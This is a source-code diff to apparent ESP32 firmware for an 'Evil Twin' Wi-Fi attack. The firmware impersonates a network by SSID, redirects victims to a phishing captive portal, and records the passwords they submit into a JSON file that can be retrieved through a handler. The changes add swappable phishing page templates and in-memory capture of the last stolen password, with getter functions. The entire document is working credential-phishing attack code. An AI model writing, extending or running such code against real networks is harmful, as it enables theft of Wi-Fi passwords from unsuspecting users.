@@ -35,6 +35,9 @@ static const char *TAG = "EVIL_TWIN_BACKEND";
 #define PATH_PASSWORDS_JSON "storage/captive_portal/passwords.json"
 
 static SemaphoreHandle_t storage_mutex = NULL;
+static const char *current_template_path = PATH_HTML_INDEX;
+static bool has_password = false;
+static char last_password[64];
 
 static void init_storage_mutex();
 
@@ -47,6 +50,9 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
 
   char password[64] = {0};
   if (http_service_query_key_value(buf, "password", password, sizeof(password)) == ESP_OK) {
+    strncpy(last_password, password, sizeof(last_password) - 1);
+    last_password[sizeof(last_password) - 1] = '\0';
+    has_password = true;
 
     if (xSemaphoreTake(storage_mutex, pdMS_TO_TICKS(5000)) == pdTRUE) {
       cJSON *root_array = NULL;
@@ -93,7 +99,8 @@ static esp_err_t submit_post_handler(httpd_req_t *req) {
     http_service_send_response(req, thanks, HTTPD_RESP_USE_STRLEN);
     free(thanks);
   } else {
-    http_service_send_response(req, "<h1>Thank you!</h1>", HTTPD_RESP_USE_STRLEN);
+    http_service_send_error(req, HTTP_STATUS_NOT_FOUND_404, "Thank you HTML not found");
+    return ESP_FAIL;
   }
 
   return ESP_OK;
@@ -127,7 +134,8 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
 
 static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
   size_t size = 0;
-  char *html = (char*)storage_assets_load_file(PATH_HTML_INDEX, &size);
+  const char *path = current_template_path ? current_template_path : PATH_HTML_INDEX;
+  char *html = (char*)storage_assets_load_file(path, &size);
   if (html) {
     http_service_send_response(req, html, HTTPD_RESP_USE_STRLEN);
     free(html);
@@ -174,12 +182,20 @@ static void register_evil_twin_handlers(void) {
 }
 
 void evil_twin_start_attack(const char *ssid) {
-  init_storage_mutex(); 
+  evil_twin_start_attack_with_template(ssid, PATH_HTML_INDEX);
+}
+
+void evil_twin_start_attack_with_template(const char *ssid, const char *template_path) {
+  init_storage_mutex();
   ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);
 
   if (!storage_assets_is_mounted()) {
     storage_assets_init();
   }
+
+  current_template_path = (template_path && template_path[0] != '\0') ? template_path : PATH_HTML_INDEX;
+  has_password = false;
+  last_password[0] = '\0';
 
   wifi_change_to_hotspot(ssid);
   start_dns_server();
@@ -198,4 +214,19 @@ void evil_twin_stop_attack(void) {
     storage_mutex = NULL; 
   }
   ESP_LOGI(TAG, "Evil Twin logic stopped.");
+}
+
+void evil_twin_reset_capture(void) {
+  has_password = false;
+  last_password[0] = '\0';
+}
+
+bool evil_twin_has_password(void) {
+  return has_password;
+}
+
+void evil_twin_get_last_password(char *out, size_t len) {
+  if (!out || len == 0) return;
+  strncpy(out, last_password, len - 1);
+  out[len - 1] = '\0';
 }
